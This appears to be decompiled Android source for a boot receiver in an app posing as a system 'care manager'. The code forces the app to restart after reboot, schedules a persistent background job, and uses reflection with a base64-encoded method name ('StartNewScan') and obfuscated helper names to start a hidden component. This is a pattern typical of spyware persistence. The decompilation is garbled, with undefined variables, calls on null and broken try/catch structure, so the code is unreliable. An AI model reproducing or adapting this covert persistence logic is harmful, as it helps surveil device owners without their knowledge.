package com.system.caremanager;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class BootReceiver extends BroadcastReceiver {

    public BootReceiver() {
        return;
    }

    private void restartApp(Context param1) {
        try {
            PackageManager result = param1.getPackageManager();
            String result2 = param1.getPackageName();
            Intent result3 = result.getLaunchIntentForPackage(result);
            int val = 1073741824;
            PendingIntent result4 = PendingIntent.getActivity(param1, null, result, val);
            String str = "alarm";
            Object result5 = param1.getSystemService(str);
            result = (AlarmManager) result;
            long result6 = System.currentTimeMillis();
            long longVal = v5 + v5;
            result.setExactAndAllowWhileIdle(null, longVal, v4, result);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void scheduleJob(Context param1) {
        String str = "jobscheduler";
        Object result = this.getSystemService(str);
        result = (JobScheduler) result;
        ComponentName componentName = new ComponentName();
        Class cls = PersistentJobService.class;
        int SDK_INT = Build$VERSION.SDK_INT;
        int val = 24;
        int val2 = 100;
        if (SDK_INT < val) {
            // branch: cond_0
        }
        JobInfo.Builder jobInfo.Builder = new JobInfo.Builder();
        JobInfo.Builder result2 = this.setPeriodic(componentName, val);
        JobInfo result3 = this.build();
        // continue loop -> :goto_0
        JobInfo.Builder jobInfo.Builder2 = new JobInfo.Builder();
        JobInfo.Builder result4 = this.setPeriodic(componentName, val);
        JobInfo result5 = this.build();
        int result6 = result.schedule(result);
        return;
    }

    public void onReceive(Context param1, Intent param2) {
        try {
            Context appContext = MainBackgroundService.appContext;
            if (appContext != null) {
                // branch: cond_0
            }
            MainBackgroundService.appContext = param1;
            this.restartApp(param1);
            BootReceiver.scheduleJob(param1);
            Class cls = MainBackgroundService.class;
            boolean result = BackgroundServiceHelper.removedqtractort40(MainBackgroundService.class, param1);
            if (result == null) {
                // branch: cond_1
            }
            Intent intent = new Intent();
            Class cls2 = MainBackgroundService.class;
            String str = "com.system.caremanager.core";
            Class result2 = Class.forName(str);
            // continue loop -> :goto_0
            } catch (Exception e) {
                e.printStackTrace();
            Object result3 = null.newInstance();
            // continue loop -> :goto_1
            } catch (Exception e) {
                e.printStackTrace();
            int val = 2;
            Class[] arr = new Class[val];
            Class cls3 = Context.class;
            arr[null] = Context.class;
            Class cls4 = Intent.class;
            arr[1] = Intent.class;
            String str2 = "U3RhcnROZXdTY2Fu";
            String result4 = DataPackagingEngine.handleError(str2);
            Method result5 = null.getDeclaredMethod(result, arr);
            } catch (Exception e) {
                e.printStackTrace();
            Object[] arr2 = new Object[val];
            arr2[null] = param1;
            arr2[1] = intent;
            Object result6 = result.invoke(null, arr2);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }

}